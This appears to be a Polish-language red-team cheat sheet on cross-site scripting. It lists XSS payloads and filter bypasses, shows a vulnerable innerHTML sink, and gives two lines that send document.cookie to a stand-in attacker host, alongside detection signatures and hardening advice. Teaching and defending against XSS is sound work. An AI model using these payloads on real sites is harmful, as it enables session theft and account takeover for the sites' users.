---
title: "Cross-Site Scripting (XSS)"
category: "red-team"
tags: ["web", "xss", "owasp"]
platform: "web"
mitre: ["T1059.007"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Cross-Site Scripting (XSS)

## TL;DR
Wstrzyknięcie JS wykonywanego w przeglądarce ofiary. Reflected (w odpowiedzi), Stored (zapisane), DOM (client-side). Skutki: kradzież sesji, keylogging, akcje w imieniu ofiary.

## Payloady
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>fetch('https://atk/c?'+document.cookie)</script>

<!-- omijanie filtrów -->
<img src=x onerror="eval(atob('...base64...'))">
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
```

## DOM XSS – szukaj sink'ów
```javascript
// źródła (source): location.hash, document.URL, referrer
// sinks: innerHTML, document.write, eval, setTimeout(string)
element.innerHTML = location.hash.slice(1);   // podatne
```

## Weaponizacja
```javascript
// Exfiltracja cookie/sesji (jeśli brak HttpOnly)
new Image().src='https://atk/?c='+encodeURIComponent(document.cookie);
```

## Wykrywanie (Blue Team)
- WAF/logi: `<script`, `onerror=`, `javascript:`, encoded payloads.
- CSP violation reports (`report-uri`) — sygnał prób wstrzyknięcia.

## Mitygacja / Hardening
- **Output encoding kontekstowy** (HTML/attr/JS/URL) + walidacja inputu.
- **CSP** (nonce/hash, `script-src 'self'`), `HttpOnly` + `SameSite` na cookie sesji.
- Frameworki z auto-escapingiem, unikaj `innerHTML`/`dangerouslySetInnerHTML`.

## Źródła
- [PortSwigger – XSS](https://portswigger.net/web-security/cross-site-scripting)
